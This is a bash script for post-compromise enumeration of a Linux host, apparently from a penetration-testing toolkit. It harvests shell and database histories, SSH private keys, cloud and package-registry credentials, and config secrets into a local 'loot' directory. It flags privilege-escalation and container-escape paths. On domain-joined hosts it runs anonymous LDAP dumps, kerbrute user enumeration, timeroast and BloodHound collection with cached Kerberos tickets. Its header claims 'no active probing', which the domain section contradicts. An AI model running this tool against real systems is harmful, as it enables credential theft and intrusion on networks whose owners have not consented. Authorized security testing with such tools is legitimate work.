#!/bin/bash
# Linux post-foothold enumeration — methodology-aligned, pure read-only
# Use when Python isn't available or isn't trusted. For Python equivalent: recon.py --mode host
#
# Usage:  bash recon.sh                 (writes to ./loot_<host>_<ts>/)
#         bash recon.sh /tmp/out        (custom outdir)
#
# Maps to linux-methodology.md Phases 1-4 + tunneling-pivoting.md.
# Pure read-only. No exploitation. No active probing.

set -u
set -o pipefail
TS=$(date +%Y%m%d_%H%M%S)
HOST=$(hostname 2>/dev/null || echo unknown)
OUT="${1:-./loot_${HOST}_${TS}}"
mkdir -p "$OUT" 2>/dev/null || { echo "[!] cannot create $OUT" >&2; exit 1; }

# timeout wrapper — bounds slow commands (find /, recursive grep, getcap -r) so
# broken NFS mounts / autofs / huge filesystems can't hang the script.
TIMEOUT_BIN=$(command -v timeout 2>/dev/null || command -v gtimeout 2>/dev/null || true)
to() { if [ -n "$TIMEOUT_BIN" ]; then "$TIMEOUT_BIN" "$1" "${@:2}"; else "${@:2}"; fi; }

run() { eval "$@" 2>/dev/null; }
section() { echo -e "\n=== $1 ==="; }
hit()  { echo "[+] $*" >> "$OUT/findings.txt"; }
note() { echo "[i] $*" >> "$OUT/findings.txt"; }
warn() { echo "[!] $*" >> "$OUT/findings.txt"; }

# ---------- 1. system / identity ----------
{
  section "uname / os-release";       run "uname -a"; run "cat /etc/os-release"
  section "id / groups";              run "id"; run "groups"
  section "users with UID 0 / shell"; run "awk -F: '\$3==0 || \$7~/sh\$/ {print}' /etc/passwd"
  section "last logins";              run "last -n 20"
  section "currently logged in";      run "w"
} > "$OUT/system.txt"

# ---------- 2. privesc primitives ----------
{
  section "sudo -n -l (no-password test)"; sudo -n -l 2>&1 || echo "(no cached sudo or password required)"
  section "sudo version";                  run "sudo --version | head -1"
  section "SUID binaries";                 to 60 find / -perm -4000 -type f 2>/dev/null
  section "SGID binaries";                 to 60 find / -perm -2000 -type f 2>/dev/null
  section "capabilities";                  to 30 getcap -r / 2>/dev/null
  section "writable system files"
  for f in /etc/passwd /etc/shadow /etc/sudoers /etc/sudoers.d/*; do
    [ -e "$f" ] && [ -w "$f" ] && echo "WRITABLE: $f"
  done
  section "polkit / pkexec";  run "pkexec --version 2>&1 | head -1"; run "ls -la /usr/bin/pkexec"
  section "kernel version";   run "uname -r"
} > "$OUT/privesc.txt"

sudo -n -l 2>/dev/null | grep -q NOPASSWD && hit "sudo NOPASSWD entries — check privesc.txt + GTFOBins"
[ -u /usr/bin/pkexec ] && hit "pkexec is SUID — PwnKit candidate (CVE-2021-4034) — linux-methodology.md §4.7"
SVER=$(sudo --version 2>/dev/null | head -1 | grep -oE '[0-9]+\.[0-9]+\.[0-9]+[a-z0-9]*')
[ -n "$SVER" ] && warn "sudo $SVER — verify against Baron Samedit (CVE-2021-3156, vuln 1.8.2-1.9.5p1)"
[ -w /etc/passwd ] && hit "/etc/passwd is WRITABLE — instant root"
[ -w /etc/shadow ] && hit "/etc/shadow is WRITABLE — root via password reset"
[ -w /etc/sudoers ] && hit "/etc/sudoers is WRITABLE — instant sudo"

# ---------- 3. cron / timers / services ----------
{
  section "/etc/crontab";  run "cat /etc/crontab"
  section "/etc/cron.*"
  for d in /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly /etc/cron.d; do
    [ -d "$d" ] && { echo "--- $d ---"; ls -la "$d"; }
  done
  section "user crontabs (readable)"
  for u in $(awk -F: '$7~/sh$/ {print $1}' /etc/passwd 2>/dev/null); do
    f="/var/spool/cron/crontabs/$u"
    [ -r "$f" ] && { echo "--- $f ---"; cat "$f"; }
  done
  section "systemd timers";        run "systemctl list-timers --all --no-pager"
  section "writable systemd units"; to 15 find /etc/systemd /lib/systemd -name "*.service" -writable 2>/dev/null
  section "running processes (top)"; run "ps auxf | head -60"
  section "writable /opt /usr/local/bin /srv (drop-in candidates)"
  for d in /opt /usr/local/bin /srv; do
    [ -d "$d" ] && find "$d" -writable 2>/dev/null | head -10
  done
} > "$OUT/services.txt"

to 15 find /etc/systemd -name "*.service" -writable 2>/dev/null | head -1 | grep -q . \
  && hit "writable systemd unit files — service binary hijack candidate"

# ---------- 4. credentials / config ----------
{
  section "shell history files (current user, root, and all readable /home users)"
  # Cover bash, zsh, fish, ksh — and walk every /home/* user, not just $HOME and root.
  for f in ~/.bash_history ~/.zsh_history ~/.history ~/.local/share/fish/fish_history ~/.ksh_history \
           /root/.bash_history /root/.zsh_history /root/.local/share/fish/fish_history /root/.ksh_history \
           /home/*/.bash_history /home/*/.zsh_history /home/*/.local/share/fish/fish_history \
           /home/*/.ksh_history /home/*/.history; do
    [ -r "$f" ] && { echo "--- $f ---"; cat "$f"; }
  done
  section "config files mentioning password/secret/key (top 50)"
  to 90 grep -ErlI --include="*.conf" --include="*.cfg" --include="*.ini" --include="*.xml" \
       --include="*.yml" --include="*.yaml" --include="*.env" --include="*.properties" \
       -e 'password|secret|api[_-]?key|token' /etc /opt /var/www /home 2>/dev/null | head -50
  section "SSH keys"
  to 60 find / \( -name "id_rsa*" -o -name "id_ed25519*" -o -name "id_ecdsa*" \) -readable 2>/dev/null | head -20
  to 60 find / -name "authorized_keys" -readable 2>/dev/null | head -10
  section "DB history"
  for f in ~/.mysql_history ~/.psql_history /root/.mysql_history /root/.psql_history; do
    [ -r "$f" ] && { echo "--- $f ---"; cat "$f"; }
  done
  section "cloud cred files (.aws / gcloud / azure)"
  to 30 find / \( -name "credentials" -path "*.aws/*" \
         -o -name "config" -path "*gcloud*" \
         -o -name "azure.json" \) -readable 2>/dev/null
  section ".env / .npmrc / .pypirc / .git/config"
  to 30 find / \( -name ".env" -o -name ".npmrc" -o -name ".pypirc" \
         -o \( -name "config" -path "*/.git/*" \) \) -readable 2>/dev/null | head -30
} > "$OUT/creds.txt"

find /home /root -name "id_rsa" -readable 2>/dev/null | head -1 | grep -q . \
  && hit "readable id_rsa keys — see creds.txt for paths"

# ---------- 5. network / pivot surface ----------
{
  section "interfaces";        run "ip a"
  section "routing v4";        run "ip route"
  section "routing v6";        run "ip -6 route"
  section "listening ports";   run "ss -tulpn"
  section "established conns"; run "ss -tunp"
  section "ARP / neighbors";   run "ip neigh"
  section "DNS";               run "cat /etc/resolv.conf"
  section "/etc/hosts";        run "cat /etc/hosts"
} > "$OUT/network.txt"

NIC_COUNT=$(ip -o link show 2>/dev/null | grep -v 'lo:' | wc -l)
[ "$NIC_COUNT" -gt 1 ] && hit "$NIC_COUNT non-loopback NICs — pivot candidate (tunneling-pivoting.md)"
ss -tlnp 2>/dev/null | grep -E '127\.|\[::1\]' | head -1 | grep -q . \
  && note "internal-only services on 127.0.0.1 — port-forward candidate"

# ---------- 6. containers / k8s ----------
{
  section "container indicators"
  [ -f /.dockerenv ]         && echo "Docker: /.dockerenv present"
  [ -d /run/.containerenv ]  && echo "Podman: /run/.containerenv present"
  grep -q docker /proc/1/cgroup 2>/dev/null    && echo "cgroup → docker"
  grep -q kubepods /proc/1/cgroup 2>/dev/null  && echo "cgroup → kubernetes pod"
  section "process capabilities"; run "capsh --print"
  section "docker socket exposure";  run "ls -la /var/run/docker.sock 2>&1"
  section "k8s SA token";            run "ls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>&1"
} > "$OUT/containers.txt"

[ -f /.dockerenv ]            && hit "INSIDE Docker container — check escape paths"
[ -S /var/run/docker.sock ]   && hit "/var/run/docker.sock present — escape via 'docker run --privileged --pid=host'"
[ -r /var/run/secrets/kubernetes.io/serviceaccount/token ] \
  && hit "INSIDE Kubernetes pod with SA token — check kubeletctl / API access"

# ---------- 7. NFS / shares ----------
{
  section "/etc/exports";  run "cat /etc/exports"
  section "showmount localhost"; run "showmount -e localhost"
  section "mounted shares"; run "mount | grep -E 'nfs|cifs|smb'"
} > "$OUT/shares.txt"

grep -q no_root_squash /etc/exports 2>/dev/null \
  && hit "/etc/exports has no_root_squash — NFS-to-SUID-root from another host"

# ---------- 8. AD / domain enumeration (linux-on-domain) ----------
# Detect domain-join state first; then run comprehensive read-only enum if joined.
DOMAIN=""
DC_HOST=""
DC_IP=""

# Realm/sssd presence
if [ -s /var/lib/sss/db ] || [ -f /etc/krb5.conf ]; then
  DOMAIN=$(grep -E '^\s*default_realm' /etc/krb5.conf 2>/dev/null | awk '{print $NF}' | tr 'A-Z' 'a-z')
  [ -z "$DOMAIN" ] && DOMAIN=$(realm list 2>/dev/null | awk '/realm-name/{print $2; exit}')
fi
[ -z "$DOMAIN" ] && DOMAIN=$(hostname -d 2>/dev/null)

# DC discovery via DNS SRV + reverse lookup
if [ -n "$DOMAIN" ]; then
  DC_HOST=$(dig +short SRV _ldap._tcp.dc._msdcs."$DOMAIN" 2>/dev/null | awk '{print $4}' | sed 's/\.$//' | head -1)
  [ -z "$DC_HOST" ] && DC_HOST=$(dig +short SRV _kerberos._tcp."$DOMAIN" 2>/dev/null | awk '{print $4}' | sed 's/\.$//' | head -1)
  [ -n "$DC_HOST" ] && DC_IP=$(dig +short A "$DC_HOST" 2>/dev/null | head -1)
fi

{
  section "domain join state"
  echo "DOMAIN=$DOMAIN"
  echo "DC_HOST=$DC_HOST"
  echo "DC_IP=$DC_IP"
  run "realm list 2>&1"
  run "hostname -d"
  section "Kerberos tickets (klist)"
  run "klist 2>&1"
  run "klist -A 2>&1"     # all caches
  section "krb5.conf"
  run "cat /etc/krb5.conf"
  section "sssd config (often readable; sometimes contains AD svc account)"
  run "cat /etc/sssd/sssd.conf"
  ls -la /var/lib/sss/secrets 2>/dev/null    # cached AD passwords (root-only normally)
  section "winbind"
  run "wbinfo --domain-info=. 2>&1"
  run "wbinfo -u 2>&1 | head -50"            # domain users
  run "wbinfo -g 2>&1 | head -30"            # domain groups
  run "wbinfo -t 2>&1"                       # trust check
  section "machine account hash material (requires root)"
  ls -la /etc/krb5.keytab /var/lib/samba/private/secrets.tdb 2>/dev/null
  section "ccache locations"
  ls -la /tmp/krb5cc_* 2>/dev/null
} > "$OUT/domain.txt"

# Comprehensive AD enum — only if we identified a domain + DC
if [ -n "$DOMAIN" ] && [ -n "$DC_IP" ]; then
  hit "host is DOMAIN-JOINED ($DOMAIN, DC=$DC_HOST/$DC_IP) — pivot to active-directory-methodology.md"
  {
    section "[ANON LDAP] rootDSE"
    run "ldapsearch -x -H ldap://$DC_IP -s base -b '' '(objectClass=*)' 2>&1 | head -80"

    section "[ANON LDAP] naming contexts"
    run "ldapsearch -x -H ldap://$DC_IP -s base -b '' namingContexts 2>&1 | grep -i namingcontext"

    BASE_DN="DC=$(echo "$DOMAIN" | sed 's/\./,DC=/g')"

    section "[ANON LDAP] attempt anonymous bind users"
    run "ldapsearch -x -H ldap://$DC_IP -b '$BASE_DN' '(objectClass=user)' sAMAccountName 2>&1 | head -40"

    section "[ANON LDAP] computer count"
    run "ldapsearch -x -H ldap://$DC_IP -b '$BASE_DN' '(objectCategory=computer)' sAMAccountName 2>&1 | grep -c sAMAccountName"

    section "[NXC] SMB null/anon"
    run "nxc smb $DC_IP -u '' -p '' 2>&1 | head -30"
    run "nxc smb $DC_IP -u 'guest' -p '' 2>&1 | head -10"
    section "[NXC] LDAP no-auth"
    run "nxc ldap $DC_IP -u '' -p '' 2>&1 | head -30"
    section "[NXC] BloodHound prereqs scan (BadSuccessor / dMSA)"
    run "nxc ldap $DC_IP -u '' -p '' -M BadSuccessor 2>&1"
    section "[NXC] timeroast (pre-Win2k computer accounts)"
    run "nxc smb $DC_IP -M timeroast 2>&1 | head -30"

    section "[KERBRUTE] no-preauth users (free hash)"
    if command -v kerbrute >/dev/null 2>&1 && [ -f /usr/share/seclists/Usernames/jsmith.txt ]; then
      run "kerbrute userenum --dc $DC_IP -d $DOMAIN /usr/share/seclists/Usernames/jsmith.txt 2>&1 | head -50"
    else
      echo "(kerbrute or seclists/Usernames/jsmith.txt missing)"
    fi

    section "[DNS] SRV records (services in domain)"
    for srv in _ldap._tcp _kerberos._tcp _kpasswd._tcp _gc._tcp _ldap._tcp.gc._msdcs; do
      run "dig +short SRV $srv.$DOMAIN @$DC_IP"
    done
    section "[DNS] AXFR (rarely permitted but free if it works)"
    run "dig axfr $DOMAIN @$DC_IP 2>&1 | head -50"
  } > "$OUT/domain_enum.txt"

  # ---------- 8b. BloodHound auto-collect (always-on for domain-joined) ----------
  BH_OUT="$OUT/bloodhound"
  mkdir -p "$BH_OUT"
  BH_CMD=""
  BH_AUTH=""

  # Auth context detection: cached ticket → use kerberos; else look for cred files.
  if klist -s 2>/dev/null; then
    BH_AUTH="kerberos"
  elif [ -n "${BLOODHOUND_USER:-}" ] && [ -n "${BLOODHOUND_PASS:-}" ]; then
    BH_AUTH="creds"
  else
    BH_AUTH="none"
  fi

  if command -v bloodhound-ce-python >/dev/null 2>&1; then
    BH_CMD="bloodhound-ce-python"
  elif command -v bloodhound-python >/dev/null 2>&1; then
    BH_CMD="bloodhound-python"
    note "bloodhound-python found (legacy schema). For BloodHound CE, install bloodhound-ce-python."
  fi

  {
    section "BloodHound collection attempt"
    echo "DOMAIN=$DOMAIN  DC=$DC_HOST  AUTH=$BH_AUTH  TOOL=${BH_CMD:-NONE}"
    if [ -z "$BH_CMD" ]; then
      echo "[!] No bloodhound collector installed. To install:"
      echo "    pipx install bloodhound-ce  # CE schema (recommended)"
      echo "    OR  pip install --user bloodhound  # legacy"
      echo "Then re-run with: $BH_CMD -d $DOMAIN -dc $DC_HOST -c All --zip -ns $DC_IP"
    elif [ "$BH_AUTH" = "kerberos" ]; then
      echo "[+] Using cached Kerberos ticket — running now (cwd=$BH_OUT):"
      ( cd "$BH_OUT" && KRB5CCNAME="${KRB5CCNAME:-/tmp/krb5cc_$(id -u)}" \
         "$BH_CMD" -d "$DOMAIN" -dc "$DC_HOST" -c All --zip -ns "$DC_IP" -k --no-pass 2>&1 ) | head -60
    elif [ "$BH_AUTH" = "creds" ]; then
      echo "[+] Using BLOODHOUND_USER / BLOODHOUND_PASS env vars — running now:"
      ( cd "$BH_OUT" && "$BH_CMD" -d "$DOMAIN" -dc "$DC_HOST" \
         -u "$BLOODHOUND_USER" -p "$BLOODHOUND_PASS" -c All --zip -ns "$DC_IP" 2>&1 ) | head -60
    else
      echo "[i] No Kerberos ticket cached and no BLOODHOUND_USER/BLOODHOUND_PASS set."
      echo "    To collect: kinit <user>@$DOMAIN  (or set env vars), then re-run."
      echo "    Manual: $BH_CMD -d $DOMAIN -dc $DC_HOST -u <USER> -p <PASS> -c All --zip -ns $DC_IP"
    fi
  } > "$BH_OUT/run.log"

  # If collection succeeded a ZIP appears in $BH_OUT
  if ls "$BH_OUT"/*.zip 2>/dev/null | head -1 | grep -q .; then
    hit "BloodHound ZIP collected: $(ls $BH_OUT/*.zip) — import into BloodHound CE UI"
  else
    note "BloodHound NOT collected — see $BH_OUT/run.log for the manual command"
  fi
fi

# ---------- summary ----------
{
  echo "# Linux post-foothold loot — $HOST @ $TS"
  echo
  echo "## Priority findings (read these first)"
  echo
  if [ -s "$OUT/findings.txt" ]; then cat "$OUT/findings.txt"
  else echo "(none flagged automatically — review files)"; fi
  echo
  echo "## Files in this loot dir"
  ls -la "$OUT"
  echo
  echo "## Methodology cross-refs"
  echo "- privesc.txt    → linux-methodology.md §4 (Privilege Escalation)"
  echo "- creds.txt      → linux-methodology.md §3 (Credential Hunting)"
  echo "- services.txt   → linux-methodology.md §2 (Local Enumeration)"
  echo "- network.txt    → tunneling-pivoting.md (pivot opportunities)"
  echo "- containers.txt → linux-methodology.md (container escape)"
  echo "- shares.txt     → linux-methodology.md NFS/SMB sections"
  echo "- domain.txt     → active-directory-methodology.md (Linux-on-AD)"
  [ -f "$OUT/domain_enum.txt" ] && echo "- domain_enum.txt → AD anon LDAP / kerbrute / nxc no-auth probes"
  [ -d "$OUT/bloodhound" ]   && echo "- bloodhound/    → BloodHound CE ZIP (import into UI) or manual cmd in run.log"
} > "$OUT/summary.md"

echo "[+] loot dir: $OUT"
echo "[+] priority findings:"
[ -s "$OUT/findings.txt" ] && cat "$OUT/findings.txt" || echo "    (none flagged — review summary.md)"
